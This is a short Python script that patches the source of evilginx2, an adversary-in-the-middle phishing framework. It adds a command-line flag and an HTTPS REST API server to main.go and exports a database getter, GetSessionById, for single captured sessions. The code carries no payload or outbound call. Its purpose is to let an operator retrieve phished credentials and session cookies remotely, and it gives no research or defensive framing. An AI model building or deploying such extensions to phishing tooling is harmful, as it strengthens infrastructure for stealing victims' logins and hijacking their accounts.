#!/usr/bin/env python3
# patch_api.py — wire the REST API into main.go + export GetSessionById. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:140]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) main.go — API port flag next to cfg_dir flag
patch("main.go",
      'var cfg_dir = flag.String("c", "", "Configuration directory path")\n',
      'var cfg_dir = flag.String("c", "", "Configuration directory path")\n'
      'var api_port = flag.Int("api", 0, "Enable HTTPS REST API with client certificate auth on the given port")\n')

# 2) main.go — start API server before terminal loop
patch("main.go",
      "\tt.DoWork()\n}",
      "\tif *api_port > 0 {\n"
      "\t\tgo core.StartApiServer(db, cfg, *api_port, filepath.Join(*cfg_dir, \"api\"))\n"
      "\t}\n"
      "\n"
      "\tt.DoWork()\n"
      "}")

# 3) database.go — exported getter for single session by id
patch("database/database.go",
      "func (d *Database) DeleteSessionById(id int) error {\n"
      "\t_, err := d.sessionsGetById(id)\n"
      "\tif err != nil {\n"
      "\t\treturn err\n"
      "\t}\n"
      "\terr = d.sessionsDelete(id)\n"
      "\treturn err\n"
      "}",
      "func (d *Database) DeleteSessionById(id int) error {\n"
      "\t_, err := d.sessionsGetById(id)\n"
      "\tif err != nil {\n"
      "\t\treturn err\n"
      "\t}\n"
      "\terr = d.sessionsDelete(id)\n"
      "\treturn err\n"
      "}\n"
      "\n"
      "func (d *Database) GetSessionById(id int) (*Session, error) {\n"
      "\treturn d.sessionsGetById(id)\n"
      "}")

print("[done] api patches applied")
